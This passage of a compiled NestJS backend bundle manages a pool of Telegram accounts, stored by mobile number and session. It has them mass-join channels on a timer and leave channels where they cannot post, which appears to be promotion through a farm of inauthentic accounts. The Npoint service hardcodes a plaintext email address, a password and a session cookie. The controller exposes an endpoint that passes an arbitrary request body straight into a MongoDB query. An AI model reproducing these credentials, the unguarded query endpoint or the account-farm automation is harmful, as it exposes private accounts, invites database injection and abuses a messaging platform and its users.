        this.cookie = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';
        this.baseUrl = 'https://www.npoint.io';
        this.signInUrl = 'https://www.npoint.io/users/sign_in';
    }
    async fetchCsrfToken() {
        this.logger.debug('Fetching CSRF token...');
        try {
            let data = JSON.stringify({
                "user": {
                    "email": "dodieajt@gmail.com",
                    "password": "Ajtdmwajt1@"
                }
            });
            let config = {
                method: 'post',
                maxBodyLength: Infinity,
                url: this.signInUrl,
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': this.cookie
                },
                data: data
            };
            const response = await axios_1.default.request(config);
            console.log("Cookie:", response.headers['set-cookie'][0]);
            this.cookie = response.headers['set-cookie'][0];
            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);
            if (!this.csrfToken) {
                throw new Error('CSRF token not found in the sign-in response.');
            }
            this.logger.debug('CSRF token fetched successfully.');
            return this.csrfToken;
        }
        catch (error) {
            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);
            throw new Error(`Failed to fetch CSRF token: ${error.message}`);
        }
    }
    async ensureCsrfToken() {
        if (!this.csrfToken) {
            await this.fetchCsrfToken();
        }
    }
    async fetchDocument(documentId) {
        this.logger.debug(`Fetching document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents/${documentId}`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to fetch document: ${error.message}`);
        }
    }
    async postDocument(document) {
        this.logger.debug('Posting a new document...');
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.post(`${this.baseUrl}/documents`, { "generate_contents": true }, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);
            await this.updateDocument(response.data.token, document);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to post document: ${error.message}`);
            throw new Error(`Failed to post document: ${error.message}`);
        }
    }
    async updateDocument(documentId, updatedDocument) {
        this.logger.debug(`Updating document with ID: ${documentId}`);
        await this.ensureCsrfToken();
        const body = {
            "contents": JSON.stringify(updatedDocument),
            "original_contents": JSON.stringify(updatedDocument),
            "schema": null,
            "original_schema": ""
        };
        try {
            const response = await axios_1.default.put(`${this.baseUrl}/documents/${documentId}`, body, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);
            return response.data;
        }
        catch (error) {
            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);
            throw new Error(`Failed to update document: ${error.message}`);
        }
    }
    async fetchAllDocuments() {
        await this.ensureCsrfToken();
        try {
            const response = await axios_1.default.get(`${this.baseUrl}/documents`, {
                headers: {
                    'X-CSRF-Token': this.csrfToken,
                    'Cookie': this.cookie
                },
            });
            return response.data;
        }
        catch (error) {
            throw new Error(`Failed to fetch all documents: ${error.message}`);
        }
    }
    async fetchCsrfTokenFromHtml(data) {
        try {
            const csrfTokenMatch = data.match(/<meta name="csrf-token" content="([^"]+)"/);
            if (!csrfTokenMatch || !csrfTokenMatch[1]) {
                throw new Error('CSRF token not found in the HTML response.');
            }
            const csrfToken = csrfTokenMatch[1];
            console.log('CSRF Token:', csrfToken);
            return csrfToken;
        }
        catch (error) {
            console.error('Error fetching CSRF token:', error);
        }
    }
};
exports.NpointService = NpointService;
exports.NpointService = NpointService = NpointService_1 = __decorate([
    (0, common_1.Injectable)()
], NpointService);


/***/ }),

/***/ "./src/components/promote-clients/dto/create-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/create-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreatePromoteClientDto {
}
exports.CreatePromoteClientDto = CreatePromoteClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'lastActive identifier',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreatePromoteClientDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreatePromoteClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/search-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/search-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchPromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchPromoteClientDto {
}
exports.SearchPromoteClientDto = SearchPromoteClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'availableDate of the promoteClient',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchPromoteClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchPromoteClientDto.prototype, "channels", void 0);


/***/ }),

/***/ "./src/components/promote-clients/dto/update-promote-client.dto.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/dto/update-promote-client.dto.ts ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdatePromoteClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_promote_client_dto_1 = __webpack_require__(/*! ./create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
class UpdatePromoteClientDto extends (0, swagger_1.PartialType)(create_promote_client_dto_1.CreatePromoteClientDto) {
}
exports.UpdatePromoteClientDto = UpdatePromoteClientDto;


/***/ }),

/***/ "./src/components/promote-clients/promote-client.controller.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.controller.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const create_promote_client_dto_1 = __webpack_require__(/*! ./dto/create-promote-client.dto */ "./src/components/promote-clients/dto/create-promote-client.dto.ts");
const search_promote_client_dto_1 = __webpack_require__(/*! ./dto/search-promote-client.dto */ "./src/components/promote-clients/dto/search-promote-client.dto.ts");
const update_promote_client_dto_1 = __webpack_require__(/*! ./dto/update-promote-client.dto */ "./src/components/promote-clients/dto/update-promote-client.dto.ts");
let PromoteClientController = class PromoteClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        return this.clientService.create(createClientDto);
    }
    async search(query) {
        return this.clientService.search(query);
    }
    async joinChannelsforPromoteClients() {
        return this.clientService.joinchannelForPromoteClients();
    }
    async checkpromoteClients() {
        this.clientService.checkPromoteClients();
        return "initiated Checking";
    }
    async addNewUserstoPromoteClients(body) {
        this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);
        return "initiated Checking";
    }
    async findAll() {
        return this.clientService.findAll();
    }
    async setAsPromoteClient(mobile) {
        return await this.clientService.setAsPromoteClient(mobile);
    }
    async findOne(mobile) {
        return this.clientService.findOne(mobile);
    }
    async update(mobile, updateClientDto) {
        return this.clientService.update(mobile, updateClientDto);
    }
    async createdOrupdate(mobile, updateClientDto) {
        return this.clientService.createOrUpdate(mobile, updateClientDto);
    }
    async remove(mobile) {
        return this.clientService.remove(mobile);
    }
    async executeQuery(query) {
        try {
            return await this.clientService.executeQuery(query);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.PromoteClientController = PromoteClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_promote_client_dto_1.CreatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: false, description: 'Mobile number' }),
    (0, swagger_1.ApiQuery)({ name: 'firstName', required: false, description: 'First name' }),
    (0, swagger_1.ApiQuery)({ name: 'lastName', required: false, description: 'Last name' }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, description: 'Username' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_promote_client_dto_1.SearchPromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('joinChannelsForPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Join Channels for PromoteClients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "joinChannelsforPromoteClients", null);
__decorate([
    (0, common_1.Get)('checkPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Check Promote Clients' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "checkpromoteClients", null);
__decorate([
    (0, common_1.Post)('addNewUserstoPromoteClients'),
    (0, swagger_1.ApiOperation)({ summary: 'Add New Users to Promote Clients' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "addNewUserstoPromoteClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('SetAsPromoteClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Promote Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "setAsPromoteClient", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "executeQuery", null);
exports.PromoteClientController = PromoteClientController = __decorate([
    (0, swagger_1.ApiTags)('Promote Clients'),
    (0, common_1.Controller)('promoteclients'),
    __metadata("design:paramtypes", [promote_client_service_1.PromoteClientService])
], PromoteClientController);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.module.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.module.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const promote_client_controller_1 = __webpack_require__(/*! ./promote-client.controller */ "./src/components/promote-clients/promote-client.controller.ts");
const promote_client_schema_1 = __webpack_require__(/*! ./schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
let PromoteClientModule = class PromoteClientModule {
};
exports.PromoteClientModule = PromoteClientModule;
exports.PromoteClientModule = PromoteClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'promoteClientModule', schema: promote_client_schema_1.PromoteClientSchema, collection: 'promoteClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
        ],
        controllers: [promote_client_controller_1.PromoteClientController],
        providers: [promote_client_service_1.PromoteClientService],
        exports: [promote_client_service_1.PromoteClientService]
    })
], PromoteClientModule);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.service.ts":
/*!******************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.service.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var PromoteClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
    constructor(promoteClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, bufferClientService) {
        this.promoteClientModel = promoteClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.bufferClientService = bufferClientService;
        this.logger = new common_1.Logger(PromoteClientService_1.name);
        this.joinChannelMap = new Map();
        this.leaveChannelMap = new Map();
        this.isLeaveChannelProcessing = false;
        this.isJoinChannelProcessing = false;
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
    }
    async create(promoteClient) {
        const newUser = new this.promoteClientModel(promoteClient);
        return newUser.save();
    }
    async findAll() {
        return this.promoteClientModel.find().exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.promoteClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log("creating");
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);
        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.promoteClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.promoteClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromPromoteMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearPromoteMap() {
        console.log("PromoteMap cleared");
        this.joinChannelMap.clear();
    }
    async joinchannelForPromoteClients(skipExisting = true) {
        if (!this.telegramService.getActiveClientSetup()) {
            this.logger.log('Starting join channel process');
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            try {
                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
                this.logger.debug(`Using existing keys: ${existingkeys.join(', ')}`);
                await connection_manager_1.connectionManager.disconnectAll();
                await (0, Helpers_1.sleep)(2000);
                const clients = await this.promoteClientModel.find({
                    channels: { "$lt": 300 },
                    mobile: { $nin: existingkeys }
                }).sort({ channels: 1 }).limit(4);
                this.logger.debug(`Found ${clients.length} clients to process`);
                if (clients.length > 0) {
                    for (const document of clients) {
                        try {
                            this.logger.debug(`Processing client: ${document.mobile}`);
                            const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });
                            const channels = await client.channelInfo(true);
                            this.logger.debug(`${document.mobile}: Found ${channels.ids.length} existing channels`);
                            await this.update(document.mobile, { channels: channels.ids.length });
                            if (channels.canSendFalseCount < 10) {
                                if (channels.ids.length < 220) {
                                    this.logger.debug(`${document.mobile}: Getting channels from channels service`);
                                    const result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                                    this.joinChannelMap.set(document.mobile, result);
                                    this.joinChannelQueue();
                                }
                                else {
                                    this.logger.debug(`${document.mobile}: Getting channels from active channels service`);
                                    const result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                                    this.joinChannelMap.set(document.mobile, result);
                                    this.joinChannelQueue();
                                }
                            }
                            else {
                                this.logger.debug(`${document.mobile}: Too many channels with no send permissions, queueing for leave: ${channels.canSendFalseChats.length}`);
                                this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);
                                this.leaveChannelQueue();
                            }
                        }
                        catch (error) {
                            const errorDetails = (0, parseError_1.parseError)(error);
                            this.logger.error(`Error processing client ${document.mobile}:`, errorDetails);
                            if (error.message === "SESSION_REVOKED" ||
                                error.message === "AUTH_KEY_UNREGISTERED" ||
                                error.message === "USER_DEACTIVATED" ||
                                error.message === "USER_DEACTIVATED_BAN") {
                                this.logger.warn(`${document.mobile}: Session invalid, removing client`);
                                await this.remove(document.mobile);
                            }
                        }
                        finally {
                            connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                    }
                }
                this.logger.log(`Join channel process triggered successfully for ${clients.length} clients`);
                return `Initiated Joining channels for ${clients.length}`;
            }
            catch (error) {
                this.logger.error('Error during joinchannelForPromoteClients:', error);
                this.clearJoinChannelInterval();
                this.clearLeaveChannelInterval();
                throw new Error("Failed to initiate channel joining process");
            }
        }
        else {
            this.logger.warn('Ignored active check for promote channels as an active client setup exists');
            return "Active client setup exists, skipping promotion";
        }
    }
    async joinChannelQueue() {
        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {
            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, skipping queue');
            return;
        }
        this.isJoinChannelProcessing = true;
        this.joinChannelIntervalId = setInterval(async () => {
            try {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.log('Join channel map is empty, clearing interval');
                    this.clearJoinChannelInterval();
                    return;
                }
                const processTimeout = setTimeout(() => {
                    this.logger.error('Join channel interval processing timeout');
                    this.clearJoinChannelInterval();
                }, this.JOIN_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing join channel interval at ${new Date().toISOString()}`);
                for (const mobile of keys) {
                    const channels = this.joinChannelMap.get(mobile);
                    if (!channels || channels.length === 0) {
                        this.logger.debug(`No more channels to join for ${mobile}, removing from map`);
                        this.removeFromPromoteMap(mobile);
                        continue;
                    }
                    const channel = channels.shift();
                    if (channels.length > 0) {
                        this.logger.debug(`${mobile}: Pending channels to join: ${channels.length}`);
